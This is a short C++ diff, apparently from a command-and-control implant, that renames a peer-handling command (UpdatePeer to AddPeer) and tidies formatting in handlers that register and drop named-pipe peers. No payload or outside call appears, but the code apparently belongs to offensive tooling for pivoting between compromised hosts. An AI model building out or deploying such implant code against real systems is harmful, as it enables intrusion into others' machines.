@@ -214,7 +214,7 @@ namespace Commands {
         }
     }
 
-    VOID UpdatePeer(_parser *parser) {
+    VOID AddPeer(_parser *parser) {
         HEXANE
 
         auto pipe_name  = Parser::UnpackWString(parser, nullptr);
@@ -223,7 +223,7 @@ namespace Commands {
         Clients::AddClient(pipe_name, peer_id);
     }
 
-    VOID RemovePeer(_parser *parser){
+    VOID RemovePeer(_parser *parser) {
         HEXANE
 
         auto peer_id = Parser::UnpackDword(parser);
@@ -238,5 +238,4 @@ namespace Commands {
         // Exit
         ntstatus = ERROR_EXIT;
     }
-
 }
